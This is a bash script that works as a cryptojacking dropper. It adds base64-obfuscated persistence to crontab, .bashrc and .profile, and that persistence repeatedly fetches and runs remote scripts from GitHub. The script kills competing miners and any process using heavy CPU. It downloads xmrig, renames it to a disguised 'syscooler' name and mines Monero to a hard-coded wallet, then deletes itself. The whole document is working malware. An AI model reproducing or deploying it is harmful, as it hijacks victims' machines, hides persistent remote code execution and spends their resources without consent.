#!/usr/bin/env bash 

WALLET=458EEu3hXGVcfSi9Uhrwa68DmC2HcAmwRNK4y3yCsV7gQzoGs8GyyZKbzMmZstEiv5ZsbXnMNEZgzLgEAKV2BycK1fFHRVE
POOL=pool.supportxmr.com:443
VERSION="1.0"

if pgrep -f "syscooler" > /dev/null; then
    exit 1
fi

(crontab -l ; echo "@reboot echo 'Y3VybCAtcyAtbyBrZmMuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tmY21pbmVyL2tmYy9tYWluL2tmYy5zaCAmJiBiYXNoIGtmYy5zaA==' | base64 -d | bash") | crontab -
(crontab -l ; echo "*/10 * * * * echo 'Y3VybCAtcyAtbyBrZmMuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tmY21pbmVyL2tmYy9tYWluL2tmYy5zaCAmJiBiYXNoIGtmYy5zaA==' | base64 -d | bash") | crontab -
echo 'echo "Y3VybCAtcyAtbyBrZmMuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tmY21pbmVyL2tmYy9tYWluL2tmYy5zaCAmJiBiYXNoIGtmYy5zaA==" | base64 -d | bash' >> ~/.bashrc
echo 'echo "Y3VybCAtcyAtbyBrZmMuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tmY21pbmVyL2tmYy9tYWluL2tmYy5zaCAmJiBiYXNoIGtmYy5zaA==" | base64 -d | bash' >> ~/.profile

curl -s -o newkfc.sh https://raw.githubusercontent.com/1oneman1/syscooler/main/syscooler.sh
sleep 60
if [ "$VERSION" != "$(grep -o '^VERSION="[0-9\.]*"' newsyscool.sh | cut -d'"' -f2)" ]; then
    chmod +x newsyscool.sh
    ./newsyscool.sh
    exit 0
else
    rm newkfc.sh
fi

processes=$(ps aux --sort=-%cpu | awk 'NR>1 && $3 > 60 {print $2}')
for pid in $processes; do
    kill -9 "$pid"
done
crontab -l | grep -vE 'curl|wget' | crontab -
grep -vE 'curl|wget' ~/.bashrc > ~/.bashrc_temp
mv ~/.bashrc_temp ~/.bashrc
grep -vE 'curl|wget' ~/.profile > ~/.profile_temp
mv ~/.profile_temp ~/.profile

MINER_PROCESSES=("xmrig" "xmr-stak" "ccminer" "ethminer" "cgminer" "cpuminer" "sgminer" "bfgminer" "lolMiner" "kfc_eater" "kfc" "eatkfc")
for process in "${MINER_PROCESSES[@]}"; do
  pids=$(pgrep "$process")
  if [ -n "$pids" ]; then
    kill "$pids"
  fi
done

curl -s -O -L https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
sleep 120
tar -zxvf xmrig-6.21.0-linux-x64.tar.gz
cd xmrig-6.21.0

random_number=$RANDOM
mv xmrig syscooler"$random_number"
current_date=$(date +"%Y%m%d")
./syscooler"$random_number" --donate-level 1 -o "$POOL" -u "$WALLET" -k --tls -p sysx"$current_date"_eater"$random_number" &  >/dev/null 2>&1 &

curl -s -o morekfc.sh https://raw.githubusercontent.com/1oneman1/syscooler/main/moresyscooler.sh && bash moresyscooler.sh

rm "$0"
